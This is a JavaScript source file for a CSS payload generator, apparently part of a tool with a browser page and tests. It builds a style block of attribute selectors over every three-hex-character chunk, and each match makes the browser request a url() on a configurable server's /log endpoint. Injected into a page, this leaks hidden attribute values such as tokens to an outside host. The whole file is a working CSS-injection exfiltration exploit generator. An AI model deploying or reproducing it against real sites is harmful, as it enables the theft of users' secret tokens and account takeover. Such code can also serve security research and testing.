// CSS payload generator. Loaded by public/index.html in the browser and
// required by the tests in Node so both exercise the same code.
(function (root) {
  function shortName(index) {
    let length = 1;
    while (index >= 26 * 36 ** (length - 1)) {
      index -= 26 * 36 ** (length - 1);
      length++;
    }
    const place = 36 ** (length - 1);
    const first = String.fromCharCode(97 + Math.floor(index / place));
    const rest = length === 1
      ? ''
      : (index % place).toString(36).padStart(length - 1, '0');
    return first + rest;
  }

  // Middle chunks use --<shortName> (alphanumeric only), so the start/end URL
  // properties are hyphenated to guarantee they never collide with one; with
  // plain --s/--e the chunks "abc" and "aae" were silently overwritten.
  function generateCSS(cfg, server) {
    const { selector, attribute, tag, startContext, endContext, useStartsWith, useEndsWith } = cfg;
    const isInput = tag === 'input';
    const t = isInput ? '+*' : '';

    let css = selector + '{';

    let counter = 0;
    const midVars = [];
    const displayVars = [];
    const hex = 'abcdef0123456789';

    for (let i = 0; i < 16; i++) {
      for (let j = 0; j < 16; j++) {
        for (let k = 0; k < 16; k++) {
          const combo = hex[i] + hex[j] + hex[k];
          const n = shortName(counter++);

          midVars.push('var(--' + n + ',none)');
          displayVars.push('var(--m-' + n + ',"")');

          if (useStartsWith) {
            css += '&[' + attribute + '^="' + combo + '"]' + t + '{--d-s:"' + combo + '";--u-s:url(' + server + '/log?c=' + combo + '&t=s)}';
          } else {
            css += '&[' + attribute + '*="' + startContext + combo + '"]' + t + '{--d-s:"' + combo + '";--u-s:url(' + server + '/log?c=' + combo + '&t=s)}';
          }

          css += '&[' + attribute + '*="' + combo + '"]' + t + '{--m-' + n + ':",' + combo + '";--' + n + ':url(' + server + '/log?c=' + combo + '&t=m)}';

          if (useEndsWith) {
            css += '&[' + attribute + '$="' + combo + '"]' + t + '{--d-e:"' + combo + '";--u-e:url(' + server + '/log?c=' + combo + '&t=e)}';
          } else {
            css += '&[' + attribute + '*="' + combo + endContext + '"]' + t + '{--d-e:"' + combo + '";--u-e:url(' + server + '/log?c=' + combo + '&t=e)}';
          }
        }
      }
    }

    if (isInput) {
      css += "&+*::after{display:block;white-space:pre-wrap;word-break:break-all;color:#00ff41;font-family:'Courier New',monospace;font-size:11px;content:\"\\a start: \" var(--d-s,\"\") \"\\a middle: \" " + displayVars.join(' ') + " \"\\a end: \" var(--d-e,\"\")}";
      css += '&+*{display:inline-block;background:var(--u-s,none),' + midVars.join(',') + ',var(--u-e,none)}';
    } else {
      css += "&:after{display:block;white-space:pre-wrap;word-break:break-all;color:#00ff41;font-family:'Courier New',monospace;font-size:11px;content:\"\\a start: \" var(--d-s,\"\") \"\\a middle: \" " + displayVars.join(' ') + " \"\\a end: \" var(--d-e,\"\")}";
      css += 'background:var(--u-s,none),' + midVars.join(',') + ',var(--u-e,none)';
    }

    css += '}';

    return '<style>' + css + '</style>';
  }

  const api = { shortName, generateCSS };
  if (typeof module !== 'undefined' && module.exports) module.exports = api;
  else Object.assign(root, api);
})(typeof window !== 'undefined' ? window : globalThis);
